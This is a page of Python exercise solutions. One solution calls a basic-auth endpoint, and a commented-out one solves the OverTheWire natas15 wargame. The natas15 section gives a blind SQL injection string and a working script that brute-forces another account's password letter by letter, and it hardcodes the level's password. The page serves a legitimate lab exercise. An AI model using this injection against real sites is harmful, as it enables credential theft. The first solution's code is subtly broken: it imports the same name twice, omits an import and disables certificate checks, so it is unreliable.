Solutions
======================================================

Requests
-----------------------

.. _RE00_solution:

Solution to RE00
++++++++++++++++++++++++++++

.. code-block:: python

    from requests.auth import HTTPBasicAuth
    from credentials import username, username

    URL = "https://userdatabase.lsy.pl/employees/report/employee/active"

    auth = HTTPBasicAuth(username, username)

    r = requests.get(URL, auth=auth, verify=False) # to ignore certificate warnings

    print(r.status_code)

.. _RE01_solution:

Solution to RE01
++++++++++++++++++++++++++++

..
    Malicious query
    ____________________________

    The user input that would escape the original query, and add the additional condition on the password is (for the first letter assumed to be "A"):

    .. code-block:: sql

        'natas16" AND password LIKE BINARY "A%'

    The full query will have then the form

    .. code-block:: sql

        SELECT * from users where username="natas16" AND password LIKE BINARY "A%"


    Working script
    ____________________________

    .. code-block:: python

        import requests
        from requests.auth import HTTPBasicAuth

        chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

        URL = "http://natas15.natas.labs.overthewire.org"

        auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

        template = 'natas16" AND password LIKE BINARY "{}%'

        letters = ""

        for _ in range(32):
            for letter in chars:
                payload = {"username":template.format(letters+letter)}
                r = requests.get(URL, auth=auth, params=payload)
                if "This user exists" in r.text:
                    letters += letter
                    print(letters)
                    break

        print("Password found {}".format(letters))